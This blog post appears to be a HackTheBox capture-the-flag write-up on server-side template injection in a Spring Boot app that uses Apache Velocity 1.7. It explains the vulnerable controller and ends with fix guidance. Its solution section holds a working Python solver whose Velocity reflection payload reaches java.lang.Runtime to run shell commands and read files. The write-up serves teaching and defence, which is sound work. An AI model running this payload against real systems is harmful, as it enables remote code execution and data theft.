---
layout: post
title: "HTB Challenge: Labyrinth Linguist"
date: 2027-08-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, apache-velocity, java, rce, spring-boot, cwe-1336]
---

A Java/Spring "english → voxalith translator" web app that compiles your input as an Apache Velocity template — a textbook [server-side template injection](https://cwe.mitre.org/data/definitions/1336.html) that walks straight to remote code execution as root.

## Overview

Labyrinth Linguist is an easy Web challenge. The app is a Spring Boot service using **Apache Velocity 1.7** as its template engine. Your `?text=` parameter is spliced into the template *source* and then evaluated, so any Velocity directive you send runs server-side. Velocity 1.x ships with no sandbox, so a short reflection gadget reaches `java.lang.Runtime` and gives full command execution. The flag is renamed to a random path at boot, so we need real RCE — not just a file read — to find and print it.

## The technique

The vulnerable controller reads the HTML template line by line, substitutes your input for a literal token, and then parses + merges the whole string as a Velocity template:

```java
String index(@RequestParam(name = "text") String textString) {
    // index.html contains the literal token "TEXT"; user input replaces it...
    template = readFileToString(".../templates/index.html", textString);
    // ...and the ENTIRE resulting string is parsed + merged as a template:
    t.setData(runtimeServices.parse(new StringReader(template), "home"));
    t.merge(new VelocityContext(), writer);   // directives in `text` execute here
    return writer.toString();
}
// readFileToString does: line = line.replace("TEXT", replacement);
```

The bug is treating user input as **template code** rather than passing it as **data** into a fixed template. Confirm evaluation with a math probe — `#set($x=7*7)$x` renders `49`:

```bash
curl -s -G "http://TARGET:PORT/" --data-urlencode 'text=#set($x=7*7)voxtest$x'
# ...<h2 class="fire">voxtest49</h2>  => SSTI confirmed
```

Velocity has no Python-style object graph and no SpEL — instead you pivot through plain **Java reflection**: from any `String`, reach its `Class` via `$x.class`, call `forName("java.lang.Runtime")`, then `getRuntime().exec(cmd)`, and stream the process stdout back into the page byte-by-byte.

## Solution

The working solver — run it against the live instance and it prints the flag:

```python
import sys, re, requests

def velocity_exec(base, cmd):
    payload = (
        '#set($x="")'
        '#set($rt=$x.class.forName("java.lang.Runtime"))'
        '#set($chr=$x.class.forName("java.lang.Character"))'
        '#set($str=$x.class.forName("java.lang.String"))'
        '#set($ex=$rt.getRuntime().exec("' + cmd + '"))'
        '$ex.waitFor()'
        '#set($out=$ex.getInputStream())'
        '#foreach($i in [1..$out.available()])'
        '$str.valueOf($chr.toChars($out.read()))'   # stream bytes -> chars
        '#end'
    )
    r = requests.get(base + "/", params={"text": payload}, timeout=20)
    m = re.search(r'<h2 class="fire">(.*?)</h2>', r.text, re.S)
    return (m.group(1) if m else r.text).lstrip("0")  # leading "0" = waitFor() rc

base = "http://" + sys.argv[1]
listing = velocity_exec(base, "ls /")                  # flag is renamed at boot
fn = next(l.strip() for l in listing.splitlines() if l.strip().startswith("flag"))
print(velocity_exec(base, "cat /" + fn).strip())
```

```bash
python3 solve.py TARGET:PORT
# [+] flag file: flag<random>.txt
# HTB{...}
```

Two practical notes that bite if you skip them:

- The **first output character is `0`** — that's `$ex.waitFor()`'s integer return rendered before the stream. Strip it.
- Command output contains newlines, so the result spans **multiple lines inside** the `<h2 class="fire">` element. Capture the whole element (`re.S`), not just the first line, or you only see the first word of `ls`.

`ls /` reveals the renamed flag (e.g. `flagdeab7efa41.txt`), then `cat /<that file>` returns the flag. The process runs as **root**, so no privilege step is needed.

## Why it worked

User input was compiled as a template instead of bound as data. Apache Velocity 1.x has no sandbox by default, and its introspection lets you walk from any object to its `Class` and on to arbitrary classes via `forName` — so reaching `java.lang.Runtime.exec` from a single reflected request is trivial. Blocklisting characters or "dangerous" words is not a mitigation for [template injection](https://cwe.mitre.org/data/definitions/1336.html).

## Fix / defense

- **Never build a template from user input.** Pass user data into a precompiled, fixed template as a context variable and render that — the engine then treats it as data, never as directives:

```java
VelocityContext ctx = new VelocityContext();
ctx.put("text", userInput);
Velocity.getTemplate("index.vm").merge(ctx, writer);
```

- If user-authored templates are a genuine requirement, configure a sandboxed `SecureUberspector` plus an introspector blocklist — but the robust answer remains "don't compile user input."
- Upgrade off Velocity 1.x, render under a low-privilege account (not root), and keep secrets out of any path the rendering process can reach.
